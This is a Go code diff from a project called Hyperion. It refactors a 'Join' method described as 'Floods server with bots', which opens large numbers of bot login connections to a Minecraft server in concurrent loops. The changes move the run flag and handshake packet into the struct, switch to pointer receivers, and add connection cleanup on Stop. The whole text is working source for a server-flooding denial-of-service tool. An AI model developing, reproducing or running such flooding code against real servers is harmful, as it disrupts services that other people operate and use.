@@ -1,7 +1,7 @@
 package methods
 
 import (
-	"Hyperion/core/method/methods"
+	"Hyperion/core/method"
 	"Hyperion/core/proxy"
 	"Hyperion/mc"
 	"Hyperion/mc/mcutils"
@@ -29,27 +29,29 @@ func (join Join) Description() string {
 	return "Floods server with bots"
 }
 
-func (join Join) Start() {
+func (join *Join) Start() {
 	join.ConnectionPool = mc.NewConnectionPool()
 	utils.Init()
-	shouldRun = true
+	join.shouldRun = true
 
 	port, err := strconv.Atoi(join.Info.Port)
 	if err != nil {
 		log.Fatal(err)
 	}
 
-	handshakePacket = mcutils.GetHandshakePacket(join.Info.Ip, port, join.Info.Protocol, mcutils.Login)
+	join.handshakePacket = mcutils.GetHandshakePacket(join.Info.Ip, port, join.Info.Protocol, mcutils.Login)
 
 	for i := 0; i < join.Info.Loops; i++ {
 		go func() {
-			for shouldRun {
+			for join.shouldRun {
 				for j := 0; j < join.Info.PerDelay; j++ {
-					loop(&join)
+					loop(join)
 				}
 				time.Sleep(join.Info.Delay)
 			}
 		}()
+	}
+}
 var shouldRun = false
 var handshakePacket packet.Packet
 
@@ -110,6 +112,7 @@ func connect(conn *mc.Connection, ip *string, port *string, protocol int, proxy 
 	return nil
 }
 
-func (join Join) Stop() {
-	shouldRun = false
+func (join *Join) Stop() {
+	join.shouldRun = false
+	join.ConnectionPool.CloseAllConnections()
 }
